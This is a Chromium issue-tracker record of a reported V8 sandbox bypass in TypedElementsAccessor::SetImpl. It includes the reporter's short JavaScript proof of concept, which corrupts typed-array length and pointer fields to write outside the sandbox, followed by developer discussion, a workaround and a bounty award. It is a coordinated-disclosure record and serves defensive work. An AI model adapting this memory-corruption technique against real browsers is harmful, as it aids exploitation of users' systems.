# V8 Sandbox Bypass: AAR/W

| Field | Value |
|-------|-------|
| **Issue ID** | [381216369](https://issues.chromium.org/issues/381216369) |
| **Status** | Verified |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Unknown |
| **Reporter** | bi...@icloud.com |
| **Assignee** | sa...@chromium.org |
| **Created** | 2024-11-28 |
| **Bounty** | $2,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md

Please see the following link for instructions on filing security bugs: https://www.chromium.org/Home/chromium-security/reporting-security-bugs

Reports may be eligible for reward payments under the Chrome VRP: https://g.co/chrome/vrp

NOTE: Security bugs are normally made public once a fix has been widely deployed.

-------------------------

VULNERABILITY DETAILS
Please provide a brief explanation of the security issue.

VERSION
Chrome Version: [x.x.x.x] + [stable, beta, or dev]
Operating System: [Please indicate OS, version, and service pack level]

REPRODUCTION CASE
Please include a demonstration of the security bug, such as an attached HTML or binary file that reproduces the bug when loaded in Chrome. PLEASE make the file as small as possible and remove any content not required to demonstrate the bug, or any personal or confidential information.

Please attach files directly, not in zip or other archive formats, and if you've created a demonstration site please also attach the files needed to reproduce the demonstration locally.

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: [tab, browser, etc.]
Crash State: [see link above: stack trace *with symbols*, registers, exception record]
Client ID (if relevant): [see link above]

CREDIT INFORMATION
Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?
Reporter credit: [goes here]

## Timeline

### bi...@icloud.com (2024-11-28)

# VULNERABILITY DETAILS

`TypedElementsAccessor`'s `SetImpl` allows reading past the end of the sandbox. This can be used to write arbitrary memory outside of the V8 sandbox.

## VERSION

Chrome Version: 132.0.6793.3 + dev
Operating System: Linux

# REPRODUCTION CASE

```
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

const f64 = new Float64Array(1);
const f64_addr = Sandbox.getAddressOf(f64);

memory.setUint32(f64_addr + 44, 0xffffffff);
memory.setUint32(f64_addr + 52, 0xffffffff);

f64[f64.length-1] = 1.1;

```
## FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

```
Detected invalid sandbox violation (not on target page). Exiting process...

```

POC not target the sandbox page, can be done with grooming tho

# CREDIT INFORMATION

Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?

Reporter credit: anonymous

### sa...@google.com (2024-11-28)

Thanks for the report! This is a known issue and doesn't allow performing an arbitrary read/write. I might see if we can add a short-term workaround though

### bi...@icloud.com (2024-11-28)

<https://issues.chromium.org/issues/40070746#comment19> implies that we provided a new way of bypassing another fix.

it sounds like we we didn't disclose this poc, the fix was going to be incomplete and we would have gotten a full bounty. knowing to expanding the guard regions to 36GB was never known until our report.

### sa...@chromium.org (2024-11-28)

I guess that's fair enough :) I'm not sure your testcase triggers that scenario since you need to corrupt three values for that (the length, external\_pointer, and base\_pointer, see the [associated test](https://chromium-review.googlesource.com/c/v8/v8/+/6055120/3/test/mjsunit/sandbox/regress/regress-40070746.js)), while I think your's just corrupts length and external\_pointer, but I also didn't try running it so I'm not sure. I'll leave it to the VRP panel to decide.

### sa...@chromium.org (2024-11-28)

(Un-deduplicating from [issue 40070746](https://issues.chromium.org/issues/40070746))

### bi...@icloud.com (2024-11-28)

our crash message in [comment #2](https://issues.chromium.org/issues/381216369#comment2) said we wrote outside of the sandbox

we had corrupted base\_pointer as well before but removed it when reporting to minimize the test case since it was unneeded to trigger

### sa...@chromium.org (2024-11-28)

Actually thinking about it again, probably your testcase would've triggered the issue since the way you construct the Float64Array should lead to `base_pointer` being a (compressed) pointer to a FixedArray, so a relatively large value already.

### bi...@icloud.com (2024-11-28)

yes this another reason is why we did not believe the this was a duplicate.

we can write far out of the sandbox

### sa...@chromium.org (2024-11-28)

I think we can consider this issue fixed by the temporary workaround in <https://chromium-review.googlesource.com/6055120>, so I'll leave this with "Status: Fixed". The workaround doesn't apply on Android, so I've files [issue 381372615](https://issues.chromium.org/issues/381372615) for tracking that. We can either try lowering the maximum ArrayBuffer size there or just wait for the proper fix for [issue 40070746](https://issues.chromium.org/issues/40070746).

### sp...@google.com (2024-12-05)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
thank you reward a report that resulted in a security beneficial change in the V8 sandbox 


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-12-05)

Thank you for the report. Since root cause of this issue was already previously known it would not ordinarily be eligible for a VRP V8 reward. Since, however, it did result in motivating a security relevant change in the V8 sandbox, we did want to issue a small reward to show our appreciation.

### ch...@google.com (2025-03-07)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/381216369)*
